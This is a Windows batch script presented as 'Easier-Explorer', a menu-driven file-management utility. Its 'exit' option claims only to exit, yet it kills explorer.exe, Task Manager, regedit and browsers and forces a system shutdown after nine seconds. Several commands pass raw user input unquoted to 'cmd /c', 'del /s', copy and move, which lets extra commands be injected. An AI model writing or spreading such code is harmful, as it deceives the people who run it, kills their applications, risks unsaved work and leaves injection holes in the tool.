@echo off
timeout /t 1 >nul
echo resizing
mode con: cols=120 lines=30
echo resizing
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Loading [.]
color b
echo Loading [..]
color a
echo Loading [...]
timeout /t 1 >nul
cls
goto :menu
cls
:menu
cls
color 6
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Please enter a command:
echo. cmd - write normal cmd commands
echo. nano - read .txt files in the specified directory
echo. ls - List files and directories
echo. cd - Change directory
echo. mkdir - Create a new directory
echo. copy - Copy files or directories
echo. move - Move files or directories
echo. del - Delete files or directories
echo. stp - Setup / modify installation
echo. exit - Exit Easier-Explorer
echo.
echo if u want to exit a command press ctrl+c;
echo.
echo ==================================
echo Credit to Imistrz21 on GitHub
echo.
echo Enter a command bellow: && set /p choice=""

if "%choice%"=="cmd" goto cmd
if "%choice%"=="nano" goto nano
if "%choice%"=="ls" goto list_files
if "%choice%"=="cd" goto change_directory
if "%choice%"=="mkdir" goto mkdir
if "%choice%"=="copy" goto copy_files
if "%choice%"=="move" goto move_files
if "%choice%"=="del" goto delete_files
if "%choice%"=="stp" goto stp
if "%choice%"=="exit" goto exit_program
if "%choice%"=="debugON" goto debugON
if "%choice%"=="debugOFF" goto debugOFF
if "%choice%"=="colorTEST" goto colorTEST

echo Invalid choice. Please try again.
goto menu

:nano
setlocal enabledelayedexpansion
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
set /p file_txt="Enter source file/directory: "

if not exist "!file_txt!" (
    echo File does not exist.
    exit /b
)
cls
echo Loading
timeout /t 1 >nul
cls
mode con: cols=80 lines=25
echo Loading
timeout /t 1 >nul
cls
echo ================================================================================
echo.
echo Contents of !file_txt!:
echo.
for /f "usebackq delims=" %%c in ("!file_txt!") do (
    echo %%c
)
echo.
pause
color a
echo Resizing
timeout /t 1 >nul
echo resizing
mode con: cols=120 lines=30
echo resizing
goto menu

:cmd
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
set /p cmd_command="Enter a command: "
cmd /c %cmd_command%
pause
goto menu

:list_files
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Listing files and directories:
dir /b /a
echo.
pause
goto menu

:mkdir
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
set /p dirname="Enter the new directory name: "
mkdir "%dirname%"
echo.
echo Directory "%dirname%" created successfully.
pause
goto menu

:change_directory
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Changing directory.
echo.
set /p newdir="Enter directory path: "
cd %newdir%
echo.
pause
goto menu

:copy_files
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Copying files.
set /p source="Enter source file/directory: "
set /p destination="Enter destination directory: "
copy %source% %destination%
echo.
pause
timeout /t 1 >nul
goto menu

:move_files
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Moving files.
set /p source="Enter source file/directory: "
set /p destination="Enter destination directory: "
move %source% %destination%
echo.
pause
timeout /t 1 >nul
goto menu

:delete_files
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo Deleting files.
set /p target="Enter file/directory to delete: "
del /s %target%
echo.
pause
timeout /t 1 >nul
goto menu

:stp
echo.
echo To do this you need to have explorer.bat copied over to c:\explorer\explorer.bat
echo it deletes the explorer entarly
timeout /t 1 >nul
xcopy c:\explorer\explorer.bat %temp%\explorar\explorer.bat
timeout /t 1 >nul
%temp%\explorar\explorer.bat
timeout /t 1 >nul
del c:\explorer\explorer.bat
exit
taskkill /f /im cmd.exe
:exit_program
cls
color 9
echo Credit to Imistrz21 on GitHub
echo ==================================
echo Welcome to Easier-Explorer!
echo.
echo.
echo Exiting Easier-Explorer...
timeout /t 1 >nul
taskkill /f /im explorer.exe
timeout /t 1 >nul
shutdown -s -t 9
timeout /t 1 >nul
taskkill /f /im regedit.exe
taskkill /f /im chrome.exe
taskkill /f /im iexplorer.exe
taskkill /f /im edge.exe
taskkill /f /im taskmgr.exe
timeout /t 1 >nul
taskkill /f /im cmd.exe
exit

:debugON
@echo on
cls
goto menu

:debugOFF
@echo off
cls
goto menu

:colorTEST
cls
echo.
color a
echo A 
pause
echo.
color b 
echo B 
pause
echo.
color c 
echo C 
pause
echo.
color d 
echo D 
pause 
cls
goto menu
